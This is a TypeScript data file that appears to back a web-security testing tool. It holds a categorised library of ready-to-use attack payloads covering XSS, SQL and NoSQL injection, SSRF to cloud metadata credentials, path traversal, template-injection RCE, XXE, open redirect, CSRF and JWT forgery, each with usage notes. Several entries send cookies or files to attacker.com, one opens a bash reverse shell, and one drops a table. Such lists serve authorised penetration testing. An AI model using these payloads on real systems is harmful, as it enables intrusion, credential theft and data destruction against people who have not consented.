export type PayloadEntry = {
  id: string;
  category: string;
  name: string;
  payload: string;
  context: string;
  tags: string[];
};

export const PAYLOAD_CATEGORIES = [
  { key: "xss",           label: "XSS",             color: "red" },
  { key: "sqli",          label: "SQL Injection",    color: "orange" },
  { key: "ssrf",          label: "SSRF",             color: "yellow" },
  { key: "idor",          label: "IDOR / BAC",       color: "purple" },
  { key: "lfi",           label: "LFI / Path Trav.", color: "blue" },
  { key: "ssti",          label: "SSTI",             color: "pink" },
  { key: "xxe",           label: "XXE",              color: "cyan" },
  { key: "open-redirect", label: "Open Redirect",    color: "green" },
  { key: "rce",           label: "RCE",              color: "red" },
  { key: "csrf",          label: "CSRF",             color: "amber" },
  { key: "nosqli",        label: "NoSQLi",           color: "lime" },
  { key: "jwt",           label: "JWT",              color: "violet" },
] as const;

const P: PayloadEntry[] = [
  // ── XSS ──────────────────────────────────────────────────────────────────
  { id: "xss-01", category: "xss", name: "Basic script tag", payload: `<script>alert(document.domain)</script>`, context: "Reflected / stored contexts where HTML is not encoded.", tags: ["basic", "html"] },
  { id: "xss-02", category: "xss", name: "Attribute breakout", payload: `"><script>alert(1)</script>`, context: "When input lands inside an HTML attribute value.", tags: ["attribute", "html"] },
  { id: "xss-03", category: "xss", name: "Img onerror", payload: `<img src=x onerror=alert(document.domain)>`, context: "Works in innerHTML sinks and when script tags are filtered.", tags: ["html", "filter-bypass"] },
  { id: "xss-04", category: "xss", name: "SVG onload", payload: `<svg/onload=alert(1)>`, context: "Bypasses many tag allowlists. Works in innerHTML and XML contexts.", tags: ["svg", "filter-bypass"] },
  { id: "xss-05", category: "xss", name: "JavaScript URI", payload: `javascript:alert(document.cookie)`, context: "href / src / action attributes. Clicks required for href.", tags: ["uri", "href"] },
  { id: "xss-06", category: "xss", name: "Event handler attribute", payload: `' onmouseover='alert(1)`, context: "Breaks out of single-quoted attribute values.", tags: ["attribute", "event"] },
  { id: "xss-07", category: "xss", name: "DOM innerHTML sink", payload: `<img src=1 onerror=alert(origin)>`, context: "Injected via document.getElementById().innerHTML = userInput.", tags: ["dom", "sink"] },
  { id: "xss-08", category: "xss", name: "Template literal injection", payload: `\${alert(1)}`, context: "Template literals: `Hello ${userInput}` in JS.", tags: ["dom", "js"] },
  { id: "xss-09", category: "xss", name: "Polyglot (attr+tag+js)", payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>`, context: "Polyglot — works in multiple HTML contexts simultaneously.", tags: ["polyglot", "advanced"] },
  { id: "xss-10", category: "xss", name: "XSS via fetch exfil", payload: `<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>`, context: "Exfiltrate session cookies to external server.", tags: ["exfil", "advanced"] },
  { id: "xss-11", category: "xss", name: "CSP bypass via JSONP", payload: `"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>`, context: "CSP allows trusted third-party domain with JSONP endpoint.", tags: ["csp-bypass", "jsonp"] },
  { id: "xss-12", category: "xss", name: "mXSS double-encode", payload: `&lt;img src=x onerror=alert(1)&gt;`, context: "Re-encoded by the browser before sanitizer processes it. Test with mXSS vectors.", tags: ["mxss", "encoding"] },

  // ── SQL Injection ─────────────────────────────────────────────────────────
  { id: "sqli-01", category: "sqli", name: "Classic auth bypass", payload: `' OR '1'='1' --`, context: "Login forms: username=' OR '1'='1' -- , password=anything.", tags: ["auth", "basic"] },
  { id: "sqli-02", category: "sqli", name: "UNION SELECT (MySQL)", payload: `' UNION SELECT NULL, username, password FROM users -- -`, context: "When column count and type are known. Adjust NULLs to match column count.", tags: ["union", "mysql"] },
  { id: "sqli-03", category: "sqli", name: "Error-based (MySQL)", payload: `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) -- -`, context: "Extracts data via MySQL error messages.", tags: ["error-based", "mysql"] },
  { id: "sqli-04", category: "sqli", name: "Boolean blind (true)", payload: `' AND 1=1 -- -`, context: "Baseline true condition. Compare response to false: AND 1=2", tags: ["blind", "boolean"] },
  { id: "sqli-05", category: "sqli", name: "Boolean blind (false)", payload: `' AND 1=2 -- -`, context: "If responses differ from AND 1=1, boolean SQLi is likely.", tags: ["blind", "boolean"] },
  { id: "sqli-06", category: "sqli", name: "Time-based blind (MySQL)", payload: `' AND SLEEP(5) -- -`, context: "Delay-based detection when no visible output difference.", tags: ["blind", "time", "mysql"] },
  { id: "sqli-07", category: "sqli", name: "Time-based blind (MSSQL)", payload: `'; WAITFOR DELAY '0:0:5' -- -`, context: "MSSQL time-delay injection.", tags: ["blind", "time", "mssql"] },
  { id: "sqli-08", category: "sqli", name: "Time-based blind (PostgreSQL)", payload: `'; SELECT pg_sleep(5) -- -`, context: "PostgreSQL time-delay injection.", tags: ["blind", "time", "postgres"] },
  { id: "sqli-09", category: "sqli", name: "Stacked queries (MSSQL)", payload: `'; DROP TABLE users -- -`, context: "MSSQL allows stacked queries. Dangerous for testing — use carefully.", tags: ["stacked", "mssql", "destructive"] },
  { id: "sqli-10", category: "sqli", name: "Column count detection", payload: `' ORDER BY 1 -- -`, context: "Increment number until error to find column count before UNION.", tags: ["recon", "union"] },
  { id: "sqli-11", category: "sqli", name: "Second-order SQLi", payload: `admin'--`, context: "Stored as username, later concatenated unsanitized into a query. Register with this name.", tags: ["second-order", "advanced"] },

  // ── SSRF ─────────────────────────────────────────────────────────────────
  { id: "ssrf-01", category: "ssrf", name: "Localhost", payload: `http://127.0.0.1/`, context: "Target internal services on the server itself.", tags: ["basic", "localhost"] },
  { id: "ssrf-02", category: "ssrf", name: "AWS metadata v1", payload: `http://169.254.169.254/latest/meta-data/`, context: "AWS IMDSv1 — returns instance metadata, IAM credentials.", tags: ["cloud", "aws", "critical"] },
  { id: "ssrf-03", category: "ssrf", name: "AWS metadata iam creds", payload: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, context: "Lists IAM role name, then append role name to get temp credentials.", tags: ["cloud", "aws", "critical"] },
  { id: "ssrf-04", category: "ssrf", name: "GCP metadata", payload: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`, context: "GCP metadata endpoint. Requires header: Metadata-Flavor: Google", tags: ["cloud", "gcp"] },
  { id: "ssrf-05", category: "ssrf", name: "Azure metadata", payload: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`, context: "Azure IMDS — requires header: Metadata: true", tags: ["cloud", "azure"] },
  { id: "ssrf-06", category: "ssrf", name: "IPv6 loopback bypass", payload: `http://[::1]/`, context: "Bypass naive 127.0.0.1 blocklist using IPv6 loopback.", tags: ["bypass", "ipv6"] },
  { id: "ssrf-07", category: "ssrf", name: "Decimal IP bypass", payload: `http://2130706433/`, context: "Decimal form of 127.0.0.1 (2^24 + 2^16 + 2^8 + 1).", tags: ["bypass", "encoding"] },
  { id: "ssrf-08", category: "ssrf", name: "DNS rebinding", payload: `http://ssrf.attacker.com/`, context: "A-record initially points to allowed host, then rebinds to 127.0.0.1.", tags: ["dns-rebind", "advanced"] },
  { id: "ssrf-09", category: "ssrf", name: "Gopher protocol", payload: `gopher://127.0.0.1:6379/_PING%0D%0A`, context: "Gopher can send arbitrary TCP payloads — interact with Redis, SMTP, memcached.", tags: ["gopher", "protocol"] },
  { id: "ssrf-10", category: "ssrf", name: "file:// protocol", payload: `file:///etc/passwd`, context: "Read local files if file:// scheme is not blocked.", tags: ["file", "lfi"] },

  // ── IDOR / Broken Access Control ─────────────────────────────────────────
  { id: "idor-01", category: "idor", name: "Sequential ID", payload: `GET /api/users/1001/profile`, context: "Change your own user ID to another user's ID in the path.", tags: ["basic", "id"] },
  { id: "idor-02", category: "idor", name: "UUID prediction", payload: `GET /api/invoices/00000000-0000-0000-0000-000000000001`, context: "Non-random UUIDs (v1 time-based) can be predicted or iterated.", tags: ["uuid", "prediction"] },
  { id: "idor-03", category: "idor", name: "Parameter tampering", payload: `POST /api/order/confirm\n{"userId": 9999, "discount": 100}`, context: "Replace your userId or add unauthorized fields in the request body.", tags: ["body", "mass-assignment"] },
  { id: "idor-04", category: "idor", name: "Horizontal privilege escalation", payload: `GET /api/messages?user=victim@email.com`, context: "Use another user's identifier in a filter parameter.", tags: ["horizontal"] },
  { id: "idor-05", category: "idor", name: "Indirect object via hash", payload: `GET /download?file=../../../etc/passwd`, context: "File download endpoints — combine with path traversal.", tags: ["file", "traversal"] },
  { id: "idor-06", category: "idor", name: "Mass assignment", payload: `{"role": "admin", "email": "attacker@x.com"}`, context: "Include extra fields in update requests that map to privileged DB columns.", tags: ["mass-assignment", "privilege"] },

  // ── LFI / Path Traversal ─────────────────────────────────────────────────
  { id: "lfi-01", category: "lfi", name: "Classic traversal", payload: `../../../etc/passwd`, context: "File include or download parameters: ?page=, ?file=, ?template=", tags: ["basic", "unix"] },
  { id: "lfi-02", category: "lfi", name: "URL-encoded traversal", payload: `..%2F..%2F..%2Fetc%2Fpasswd`, context: "Bypass path validation that only checks literal '../'.", tags: ["encoding", "bypass"] },
  { id: "lfi-03", category: "lfi", name: "Double-encoded traversal", payload: `..%252F..%252F..%252Fetc%252Fpasswd`, context: "Server decodes twice. Second decode produces ../", tags: ["double-encode", "bypass"] },
  { id: "lfi-04", category: "lfi", name: "Null byte termination", payload: `../../../etc/passwd%00.jpg`, context: "Bypasses appended file extension in PHP < 5.3.", tags: ["null-byte", "php"] },
  { id: "lfi-05", category: "lfi", name: "Windows traversal", payload: `..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts`, context: "Windows path separator. Also try mixed: ..\\/../", tags: ["windows", "basic"] },
  { id: "lfi-06", category: "lfi", name: "PHP wrappers — base64", payload: `php://filter/convert.base64-encode/resource=/etc/passwd`, context: "PHP file:// LFI — returns file contents as base64.", tags: ["php", "wrapper", "advanced"] },
  { id: "lfi-07", category: "lfi", name: "PHP wrappers — RCE via data://", payload: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`, context: "RCE if data:// wrapper is allowed (<?php system($_GET['cmd']);?>).", tags: ["php", "rce", "wrapper"] },
  { id: "lfi-08", category: "lfi", name: "Log poisoning", payload: `/var/log/apache2/access.log`, context: "Include apache log that contains previously injected PHP via User-Agent.", tags: ["log-poisoning", "rce"] },

  // ── SSTI ─────────────────────────────────────────────────────────────────
  { id: "ssti-01", category: "ssti", name: "Detection probe", payload: `{{7*7}}`, context: "If response shows 49, template engine is evaluating input.", tags: ["detection", "jinja2", "twig"] },
  { id: "ssti-02", category: "ssti", name: "Jinja2 RCE", payload: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`, context: "Jinja2 (Python/Flask) — execute OS commands.", tags: ["jinja2", "flask", "rce"] },
  { id: "ssti-03", category: "ssti", name: "Twig RCE (PHP)", payload: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`, context: "Twig (PHP) — RCE via registerUndefinedFilterCallback.", tags: ["twig", "php", "rce"] },
  { id: "ssti-04", category: "ssti", name: "Freemarker RCE (Java)", payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${"id"?ex}', context: "Freemarker (Java) — Execute class gives arbitrary command execution.", tags: ["freemarker", "java", "rce"] },
  { id: "ssti-05", category: "ssti", name: "Pebble RCE (Java)", payload: `{%raw%}{% set cmd = "id" %}{% set exec = "".class.forName("java.lang.Runtime").getMethod("exec","".class).invoke("".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),cmd) %}{% endraw %}`, context: "Pebble template engine in Java.", tags: ["pebble", "java", "rce"] },
  { id: "ssti-06", category: "ssti", name: "Handlebars RCE (JS)", payload: `{{#with "s" as |string|}}\n  {{#with "e"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub "constructor")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push "return require('child_process').execSync('id')"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}`, context: "Handlebars.js (Node.js) SSTI to RCE.", tags: ["handlebars", "nodejs", "rce"] },

  // ── XXE ──────────────────────────────────────────────────────────────────
  { id: "xxe-01", category: "xxe", name: "Classic file read", payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>`, context: "Send in any XML body. Server must return &xxe; value in response.", tags: ["basic", "file-read"] },
  { id: "xxe-02", category: "xxe", name: "OOB via DNS", payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\n<root>&xxe;</root>`, context: "Out-of-band detection — server makes DNS request to attacker.com.", tags: ["oob", "dns"] },
  { id: "xxe-03", category: "xxe", name: "OOB data exfil", payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM "file:///etc/passwd">\n  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">\n  %dtd;\n]>\n<foo>&send;</foo>`, context: "Blind OOB — exfiltrate file content via external DTD.", tags: ["blind", "oob", "exfil"] },
  { id: "xxe-04", category: "xxe", name: "SSRF via XXE", payload: `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&xxe;</root>`, context: "Use XXE to trigger SSRF to cloud metadata endpoint.", tags: ["ssrf", "cloud", "critical"] },
  { id: "xxe-05", category: "xxe", name: "XXE in SVG upload", payload: `<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg>&xxe;</svg>`, context: "Upload SVG files that are parsed by the server or rendered by browsers.", tags: ["svg", "upload", "file-read"] },

  // ── Open Redirect ─────────────────────────────────────────────────────────
  { id: "or-01", category: "open-redirect", name: "Protocol-relative URL", payload: `//attacker.com`, context: "Used in: ?next=, ?redirect=, ?url=, ?return=, ?returnTo=", tags: ["basic"] },
  { id: "or-02", category: "open-redirect", name: "Absolute URL", payload: `https://attacker.com/`, context: "Simple absolute redirect — bypassed if server only checks startsWith.", tags: ["basic"] },
  { id: "or-03", category: "open-redirect", name: "Bypass with @", payload: `https://trusted.com@attacker.com`, context: "Browser ignores everything before @ as credentials. URL goes to attacker.com.", tags: ["bypass", "credential"] },
  { id: "or-04", category: "open-redirect", name: "Bypass with backslash", payload: `https://trusted.com\\\\attacker.com`, context: "Some parsers treat \\ as path, browsers as host separator.", tags: ["bypass", "backslash"] },
  { id: "or-05", category: "open-redirect", name: "Subdomain confusion", payload: `https://trusted.com.attacker.com`, context: "Bypass startsWith('https://trusted.com') check.", tags: ["bypass", "subdomain"] },
  { id: "or-06", category: "open-redirect", name: "URL-encoded slash", payload: `//attacker.com%2F`, context: "Encoded path to bypass filters checking for //.", tags: ["encoding", "bypass"] },
  { id: "or-07", category: "open-redirect", name: "Open redirect to XSS", payload: `javascript:alert(document.domain)`, context: "If redirect destination is not validated for scheme.", tags: ["xss-chain", "critical"] },

  // ── RCE ──────────────────────────────────────────────────────────────────
  { id: "rce-01", category: "rce", name: "Command injection (semicolon)", payload: `; id`, context: "Appended to OS commands: ping 8.8.8.8; id", tags: ["basic", "unix"] },
  { id: "rce-02", category: "rce", name: "Command injection (pipe)", payload: `| id`, context: "Pipes output to your command: nslookup domain | id", tags: ["basic", "unix"] },
  { id: "rce-03", category: "rce", name: "Command injection (backtick)", payload: "`id`", context: "Shell backtick substitution — executes and substitutes output.", tags: ["backtick", "unix"] },
  { id: "rce-04", category: "rce", name: "Command injection ($())", payload: `$(id)`, context: "POSIX command substitution — cleaner than backticks.", tags: ["unix", "substitution"] },
  { id: "rce-05", category: "rce", name: "Windows command injection", payload: `& whoami`, context: "Windows CMD — & runs next command. Also try &&, ||", tags: ["windows", "cmd"] },
  { id: "rce-06", category: "rce", name: "Blind RCE via sleep", payload: `; sleep 5`, context: "Blind detection — if response delays 5s, RCE is present.", tags: ["blind", "time"] },
  { id: "rce-07", category: "rce", name: "Blind RCE via DNS OOB", payload: `; nslookup attacker.burpcollaborator.net`, context: "Out-of-band detection via DNS lookup.", tags: ["blind", "oob", "dns"] },
  { id: "rce-08", category: "rce", name: "Reverse shell (bash)", payload: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`, context: "Establish reverse shell. Replace attacker.com and port.", tags: ["reverse-shell", "bash"] },

  // ── CSRF ─────────────────────────────────────────────────────────────────
  { id: "csrf-01", category: "csrf", name: "HTML form auto-submit", payload: `<form method="POST" action="https://target.com/api/change-email">\n  <input type="hidden" name="email" value="attacker@evil.com">\n  <input type="submit">\n</form>\n<script>document.forms[0].submit()</script>`, context: "Host on attacker site. Victim must be authenticated. Works on endpoints without CSRF tokens.", tags: ["html", "form", "basic"] },
  { id: "csrf-02", category: "csrf", name: "GET-based CSRF", payload: `<img src="https://target.com/api/delete?id=123">`, context: "For state-changing GET requests — anti-pattern but common in old apps.", tags: ["get", "img"] },
  { id: "csrf-03", category: "csrf", name: "JSON CSRF via fetch", payload: `<script>\nfetch('https://target.com/api/update', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'text/plain'},\n  body: JSON.stringify({email:'attacker@evil.com'})\n})\n</script>`, context: "When endpoint accepts text/plain with JSON body. Bypasses CORS preflight.", tags: ["json", "fetch", "advanced"] },

  // ── NoSQL Injection ───────────────────────────────────────────────────────
  { id: "nosqli-01", category: "nosqli", name: "MongoDB auth bypass ($ne)", payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`, context: "MongoDB query: $ne (not equal) — matches any non-null value.", tags: ["mongodb", "auth", "basic"] },
  { id: "nosqli-02", category: "nosqli", name: "MongoDB $gt bypass", payload: `{"username": "admin", "password": {"$gt": ""}}`, context: "Password greater than empty string — true for any non-empty password.", tags: ["mongodb", "auth"] },
  { id: "nosqli-03", category: "nosqli", name: "MongoDB $regex", payload: `{"username": "admin", "password": {"$regex": "^a"}}`, context: "Blind injection via regex — enumerate password char by char by checking responses.", tags: ["mongodb", "blind", "regex"] },
  { id: "nosqli-04", category: "nosqli", name: "URL param injection", payload: `?username[$ne]=invalid&password[$ne]=invalid`, context: "Express/qs parser auto-converts [] to object notation.", tags: ["url", "qs", "basic"] },

  // ── JWT ───────────────────────────────────────────────────────────────────
  { id: "jwt-01", category: "jwt", name: "None algorithm", payload: `{"alg":"none","typ":"JWT"}`, context: "Change header alg to 'none', remove signature. Some libs accept.", tags: ["alg-none", "critical"] },
  { id: "jwt-02", category: "jwt", name: "HS256 → RS256 confusion", payload: `{"alg":"HS256","typ":"JWT"}`, context: "Server uses RS256; switch to HS256 and sign with the public key as the secret.", tags: ["alg-confusion", "critical"] },
  { id: "jwt-03", category: "jwt", name: "JWT secret brute force", payload: `hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`, context: "Crack weak HS256 secrets offline with hashcat mode 16500.", tags: ["bruteforce", "offline"] },
  { id: "jwt-04", category: "jwt", name: "JWK injection", payload: `{"alg":"RS256","jwk":{"kty":"RSA","n":"...attacker-key...","e":"AQAB"},"typ":"JWT"}`, context: "Inject your own JWK in the header if server trusts embedded key.", tags: ["jwk", "critical"] },
  { id: "jwt-05", category: "jwt", name: "kid path traversal", payload: `{"alg":"HS256","kid":"../../../../../../dev/null","typ":"JWT"}`, context: "kid header points to file used as secret. /dev/null = empty string = sign with ''.", tags: ["kid", "path-traversal", "critical"] },
];

export const PAYLOADS = P;
export default P;
